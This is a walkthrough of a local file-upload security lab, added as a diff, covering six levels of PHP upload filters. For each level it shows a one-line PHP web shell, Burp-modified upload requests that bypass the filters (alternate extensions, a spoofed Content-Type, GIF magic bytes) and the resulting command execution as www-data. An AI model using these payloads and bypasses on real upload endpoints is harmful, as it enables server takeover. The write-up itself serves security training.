@@ -1,0 +1,330 @@
+  [-Prerequisites-]
+   
+		   htacess is configuration file for controlling behaviour of website, commonly used in Apache webserver.
+		   docker-config file is configuration file for docker setup the behaviour for website, like htaccess.
+
+
+  [-Exploitation-]
+  
+  
+      -----------level 1------------
+      
+		   
+		   First, take an overview of the lab. 
+		   In index.php:
+		   
+			session_start();
+			$dir = 'upload/' . session_id();
+			if ( !file_exists($dir) )
+			mkdir($dir);
+
+			if(isset($_GET["debug"])) die(highlight_file(__FILE__));
+			if(isset($_FILES["file"])) {
+			$error = '';
+			$success = '';
+			try {
+			    $file = $dir . "/" . $_FILES["file"]["name"];
+			    move_uploaded_file($_FILES["file"]["tmp_name"], $file);
+			    $success = 'Successfully uploaded file at: <a href="/' . $file . '">/' . $file . ' </a><br>';
+			    $success .= 'View all uploaded file at: <a href="/' . $dir . '/">/' . $dir . ' </a>';
+			} catch(Exception $e) {
+			    $error = $e->getMessage();
+			}
+		    }
+		    
+		   These code simply create a path to our upload file.
+		   Notable that " $file = $dir . "/" . $_FILES["file"]["name"];
+				  move_uploaded_file($_FILES["file"]["tmp_name"], $file); "  
+		   
+		      ===> Destination uploaded file: "upload/[session-id]/[file-name]"
+		      
+		   Then, look at docker-config file
+		   
+			<FilesMatch ".+\.ph(ar|p|tml)$">
+			  SetHandler application/x-httpd-php
+			</FilesMatch>
+			
+		   We saw some restriction, the "FilesMatch" only allows all three extensions (phar, php, phtml) and treat them as PHP (SetHandler application/x-httpd-php)
+			 
+			=> Our uploaded file should be PHP
+			
+		   So we take that point and create a simple PHP payload to RCE: <?php system($_GET['cmd']); ?>
+		   Then upload it, then there gonna appear the location of our file, at upload/123abc/payload.php
+		   Now, choose the argument "cmd" as a command we want to use at the link:
+		   
+			    http://localhost:12001/upload/a36f5b02ab4b56f38d71cf38b9deb43c/payload.php?cmd=id
+		   
+		   [RESULT] uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+			
+			
+		   => RCE!
+	   
+   
+   
+   
+       ---------------level 2----------------
+
+		   This level kind of the same previous level, but has more restriction, look at index.php
+		   
+		   
+		      if(isset($_GET["debug"])) die(highlight_file(__FILE__));
+		      if(isset($_FILES["file"])) {
+			...
+			...
+			...
+			    $extension = explode(".", $filename)[1];
+			    if ($extension === "php") {
+				die("Hack detected");
+			    }
+			   ...
+			   ...
+			   ...
+			} catch(Exception $e) {
+			    $error = $e->getMessage();
+			}
+		    }
+		    
+		  
+		  [?] You can see the explode function, it takes separate the filename before the comma and after the comma, then take the [1] element of the array.
+		  
+		  Example, test.php will through "explode" by separating "test" and "php" to an array. The "test" is the first element and "php" is the second one.
+		  
+		  So, simply we cant use php file, but at the docker-config file there still more 2 extensions "phar" and "phtml" not listed at restriction
+		  
+		  => use the previous payload at level1 then use burpsuite to change the filename
+		  
+		  
+			POST / HTTP/1.1
+			Host: localhost:12002
+			...
+			...
+			...
+
+			-----------------------------81529042442250503612456293457                         CHANGE
+			Content-Disposition: form-data; name="file"; filename="test.php"                   ======>        Content-Disposition: form-data; name="file"; filename="test.phtml"
+			Content-Type: application/x-php
+
+			<?php system($_GET['cmd']); ?>
+
+			-----------------------------81529042442250503612456293457--
+			
+			
+		  Notable that the "Content-Disposition: form-data; name="file"; filename="test.php"" !!!
+		  => So the idea is change the extension of filename to "phar" or "phtml"
+		  Then we successfully upload it
+		  
+			 http://localhost:12002/upload/a36f5b02ab4b56f38d71cf38b9deb43c/payload.phtml
+		  
+		  
+		  [RCE]  http://localhost:12002/upload/a36f5b02ab4b56f38d71cf38b9deb43c/test.phtml?cmd=id    
+		    
+		  [RESULT] uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+  
+  
+      ------------level 3----------------
+
+           	  The method at lv2 still works!
+      
+      
+      ------------level 4----------------
+      
+          	  Not found.
+          
+      ------------level 5----------------
+          
+          
+		  Take a look at index.php
+		  
+		  
+			  try {
+			    $mime_type = $_FILES["file"]["type"];
+			    if (!in_array($mime_type, ["image/jpeg", "image/png", "image/gif"])) {
+				die("Hack detected");
+			    }
+			 
+			    
+		  [?]  Mime type is type of data contained in a file, helps application understand what it is.
+		  	    
+		  So, this lab only accept image have extensions "jpeg", "png", "gif"; lets try the previous method.
+		  
+		  
+		 [Burpsuite]    
+		 
+			POST / HTTP/1.1
+			Host: localhost:12005
+			...
+			...
+			...
+			
+			-----------------------------257705898038764485123224705772
+			
+			Content-Disposition: form-data; name="file"; filename="test.php"               CHANGE
+			Content-Type: application/x-php                                                ======>        Content-Type: image
+	  
+			<?php system($_GET['cmd']); ?>
+
+			-----------------------------257705898038764485123224705772--
+			
+		
+		 Notable that "Content-Type: application/x-php"
+		 This will recognize our file is a PHP programme, lets change this to what mime type it accept, test by uploading an image to see what Content-Type header appears.
+		
+		
+		 [Burpsuite]
+		 
+		 
+		       ---
+		       -----
+		       -------
+		       
+		       Content-Type: image/jpeg
+		       
+		       ....
+		       
+		       
+		       
+		  Lets use this with our payload 
+			                                            CHANGE
+		       Content-Type: application/x-php              ======>        Content-Type: image
+		       
+		       
+		  
+		  [localhost:12005] 
+			
+			Successfully uploaded file at: /upload/61be77dea5959e3129da1dfed5e185fa/payload.php 
+			
+			
+		  
+		  ehhh, we successfully upload our payload.
+		  
+		  [RESULT] uid=33(www-data) gid=33(www-data) groups=33(www-data) 
+		  
+		  => RCE
+		 
+		 
+	----------level 6-------------
+	
+	
+	This lab kind of the same level 5, but:
+	
+	        ...
+    	        ....
+    	        .....
+    	        
+		if(isset($_FILES["file"])) {
+		try {
+		    $finfo = finfo_open(FILEINFO_MIME_TYPE);
+		    $mime_type = finfo_file($finfo, $_FILES['file']['tmp_name']);
+		    $whitelist = array("image/jpeg", "image/png", "image/gif");
+		    if (!in_array($mime_type, $whitelist, TRUE)) {
+		        die("Hack detected");
+		    }
+		    
+		.......   
+		
+	[?] So the question is what function "finfo_open" do. 
+	    
+		    finfo_open is a function create file info resource,  select name of a magic database file, usually something like /path/to/magic.mime.If not specified, the MAGIC environment variable is used. If this variable is not set either, /usr/share/misc/magic is used by default. A .mime and/or .mgc suffix is added if needed. (VScode)
+		    
+		=> So its simply return the magic number appropriate with the mime type
+		    
+		[?] "finfo_file" is return infomation about a file.
+		
+		=> So $mime_type is returning mime type of the uploaded file base on the magic number, and this will be compared with $whitelist
+		
+		   If them different => "Hack detected"
+	   
+	[?] What is magic number, magic numbers are the first bits of a file which uniquely identify the type of file
+	
+	
+	[Burpsuite]
+	
+	
+		-----------------------------74208933638048605161751632212
+		Content-Disposition: form-data; name="file"; filename="test.php"
+		Content-Type: application/x-php
+                                                                                               CHANGE
+		<?php system($_GET['cmd']); ?>                                                 ======>        GIF87a   <?php system($_GET['cmd']); ?> 
+
+		-----------------------------74208933638048605161751632212--
+		
+         
+         
+         So, we are gonna add magic number of GIF file, then the website will recognize our file as GIF file
+         
+         
+         [localhost:12006]
+         
+                Successfully uploaded file at: /upload/61be77dea5959e3129da1dfed5e185fa/test.php 
+          
+         => RCE!
+         
+         
+         
+                       
+                
+         
+               	
+
+	
+	
+	 
+	
+	        
+	        
+	
+
+	
+	
+	
+	    
+	
+	
+	 	  
+		  
+	  
+	  
+	  
+	  
+	  
+	  
+	
+	       
+  	       
+           	 
+	  
+	  
+	        
+	 
+	 
+	        
+	
+		 
+               
+          
+          
+              
+      
+      
+      
+     
+      
+       
+  
+ 
+  
+  
+  
+  
+  
+  
+   
+   
+   
+      
+   
+   
+   
+ 
+
+           
